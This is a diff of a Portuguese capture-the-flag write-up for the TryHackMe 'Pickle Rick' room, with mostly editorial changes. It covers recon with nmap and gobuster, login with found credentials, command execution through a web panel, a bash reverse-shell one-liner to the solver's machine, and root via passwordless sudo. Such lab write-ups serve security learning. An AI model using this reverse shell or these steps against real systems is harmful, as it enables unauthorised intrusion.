@@ -10,17 +10,24 @@
 Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/picklerick), feito por [Try Hack Me](https://tryhackme.com/p/tryhackme), [ar33zy](https://tryhackme.com/p/ar33zy) e [arebel](https://tryhackme.com/p/arebel).
 
 Dificuldade: `Fácil`
+
 Resolvido em: `2026/03/28`
 
 # Conteúdos
 
-TODO
+- [Pickle Rick](#pickle-rick)
+- [Conteúdos](#conteúdos)
+- [Writeup](#writeup)
+   * [Sumário](#sumário)
+   * [Reconhecimento](#reconhecimento)
+   * [Exploração](#exploração)
+   * [Escalação de Privilégios](#escalação-de-privilégios)
 
 # Writeup
 
 ## Sumário
 
-O desafio `Pickle Rick` consiste na aquisição do acesso a um painel de administrador num website e, em seguida, no uso de uma linha de comando para realizar execução de código remotamente.
+O desafio `Pickle Rick` consiste na aquisição do credenciais a um painel de administrador no website e, em seguida, no uso de um terminal para escalação de privilégios.
 
 ## Reconhecimento
 
@@ -29,7 +36,7 @@ Como normal, a plataforma THM providencia o IP de acesso para a máquina. Primei
 Logo após, verifica-se se tudo está certo.
 
 ```bash
-kali@kali $ ping -c 3 pr.net
+ping -c 3 pr.net
 PING pr.net (<MACHINE_IP>) 56(84) bytes of data.
 64 bytes from pr.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=234 ms
 64 bytes from pr.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=257 ms
@@ -43,7 +50,7 @@ rtt min/avg/max/mdev = 176.092/222.442/257.260/34.125 ms
 Sem nenhuma outra informação disponível, realizei um escaneamento das portas abertas com `nmap`[^nmap] para encontrar um caminho de penetração.
 
 ```bash
-kali@kali $ nmap -T4 -sV -A pr.net
+nmap -T4 -sV -A pr.net
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-28 12:39 UTC
 Nmap scan report for pr.net (<MACHINE_IP>)
 Host is up (0.17s latency).
@@ -108,7 +115,7 @@ Que mostra a existência do diretório `assets/`. Acessá-lo providencia alguns 
 Agora segui para o próximo passo lógico: vasculhamento de diretórios em procura de um painel de entrada. Usei da ferramenta `gobuster`[^gobuster] com uma das wordlists padrões do kali[^wl-dirl23med] para vasculhar a porta `html`, procurando por extensões comuns em websites (`.html`, `.php` e `.txt`):
 
 ```bash
-kali@kali $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u pr.net -x .html,.txt,.php -t 50
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u pr.net -x .html,.txt,.php -t 50
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -153,7 +160,8 @@ Mais um valor de senha para tentar. Usando do usuário `R1ckRul3s` e da senha `W
 
 Já que o console é o único elemento iterativo novo, realizei um `ls`[^ls] para ver os arquivos disponíveis...
 
-```
+```bash
+ls
 Sup3rS3cretPickl3Ingred.txt
 assets
 clue.txt
@@ -195,7 +203,7 @@ Mas o comando não funcionou quando invocado desta forma. Com `echo`, realizei u
 echo "bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1" | bash
 ```
 
-E funcionou, estabelecendo a conexão com meu terminal. Imediatamente, invoquei `sudo -l` para verificar as permissões do sistema, obtendo ótimas notícias:
+O que simplesmente encadeia meu comando, e funcionou, estabelecendo a conexão com meu terminal. Imediatamente, invoquei `sudo -l` para verificar as permissões do sistema, obtendo ótimas notícias:
 
 ```bash
 Matching Defaults entries for www-data on ip-<MACHINE_IP>:
@@ -208,12 +216,12 @@ User www-data may run the following commands on ip-<MACHINE_IP>:
 O usuário `www-data` possuia permissão `(ALL) NOPASSWD`. Ou seja, bastava realizar a elevação imediata de privilégios com `sudo sh`:
 
 ```bash
-$ sudo sh
+sudo sh
 whoami
 root
 ```
 
-O útlimo passo, agora, era buscar os três ingredientes (as três flags). Além de `/var/www/html/Sup3rS3cretPickl3Ingred.txt`, também encontrei `/usr/rick/second ingredients` e `/root/3rd.txt`. Com isso, a máquina foi completa.
+O último passo, agora, era buscar os três ingredientes (as três flags). Além de `/var/www/html/Sup3rS3cretPickl3Ingred.txt`, também encontrei `/usr/rick/second ingredients` e `/root/3rd.txt`. Com isso, a máquina foi completa.
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
